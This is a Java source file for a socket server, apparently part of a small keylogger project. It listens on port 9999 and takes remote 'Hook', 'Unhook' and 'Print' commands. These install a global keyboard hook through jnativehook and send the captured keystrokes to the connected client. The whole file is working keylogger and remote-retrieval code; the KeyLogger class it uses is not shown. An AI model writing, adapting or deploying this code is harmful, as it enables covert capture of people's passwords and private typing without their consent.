package src;

import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Scanner;

import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.GlobalScreen;

public class Server {
    public static void main(String[] args) {
        try {
            ServerSocket sock = new ServerSocket(9999, 5, InetAddress.getLocalHost());
            System.out.println("Created socket");

            Socket cliSock = sock.accept();
            System.out.println("Connected");

            try {
                GlobalScreen.registerNativeHook();
            }
            catch (NativeHookException ex) {
                System.err.println("There was a problem registering the native hook.");
                System.err.println(ex.getMessage());

                System.exit(1);
            }

            KeyLogger kl = new KeyLogger();

            InputStream is = cliSock.getInputStream();
            OutputStream os = cliSock.getOutputStream();
            Scanner sc = new Scanner(System.in);

            String command = "";
            boolean isHooked = false;

            while (!command.trim().equals("Exit"))
            {
                byte[] buffer = new byte[100];
                is.read(buffer);
                command = new String(buffer);
                command = command.trim();

                switch(command) {
                    case "Hook":
                        if (isHooked == false) {
                            GlobalScreen.addNativeKeyListener(kl);
                            System.out.println("Add native key listener");
                            isHooked = true;
                        }
                        break;
                    case "Unhook":
                        if (isHooked == true) {
                            GlobalScreen.removeNativeKeyListener(kl);
                            System.out.println("Remove native key listener");
                            kl.clearLogs();
                            isHooked = false;
                        }
                        break;
                    case "Print":
                        System.out.println("laksdjf");
                        String out = "";
                        for (int i = 0; i < kl.logs.size(); i++) {
                            out += kl.logs.get(i);
                        }
                        byte[] tmp = out.getBytes();
                        os.write(tmp);
                        break;
                }
            }

            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException nativeHookException) {
                nativeHookException.printStackTrace();
            }

            sock.close();
            System.out.println("Socket closed");
        }
        catch (IOException ioE) {
            ioE.printStackTrace();
        }
    }
}
